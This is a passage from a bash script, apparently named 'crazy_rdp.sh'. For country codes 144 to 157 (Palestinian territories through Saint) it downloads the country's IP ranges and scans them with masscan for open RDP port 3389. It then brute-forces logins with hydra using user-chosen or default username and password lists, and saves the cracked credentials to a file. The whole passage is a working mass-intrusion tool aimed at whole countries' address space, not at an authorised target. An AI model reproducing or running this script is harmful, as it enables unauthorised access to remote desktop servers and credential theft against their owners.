hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "144" ]; then
curl http://ipdiapazon.16mb.com/Palestinian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "145" ]; then
curl http://ipdiapazon.16mb.com/Panama.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "146" ]; then
curl http://ipdiapazon.16mb.com/Papua_new_guinea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "147" ]; then
curl http://ipdiapazon.16mb.com/Paraguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "148" ]; then
curl http://ipdiapazon.16mb.com/Peru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "149" ]; then
curl http://ipdiapazon.16mb.com/Philippines.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "150" ]; then
curl http://ipdiapazon.16mb.com/Poland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "151" ]; then
curl http://ipdiapazon.16mb.com/Portugal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "152" ]; then
curl http://ipdiapazon.16mb.com/Puerto_rico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "153" ]; then
curl http://ipdiapazon.16mb.com/Qatar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "154" ]; then
curl http://ipdiapazon.16mb.com/Romania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "155" ]; then
curl http://ipdiapazon.16mb.com/Russia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "156" ]; then
curl http://ipdiapazon.16mb.com/Rwanda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "157" ]; then
curl http://ipdiapazon.16mb.com/Saint.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

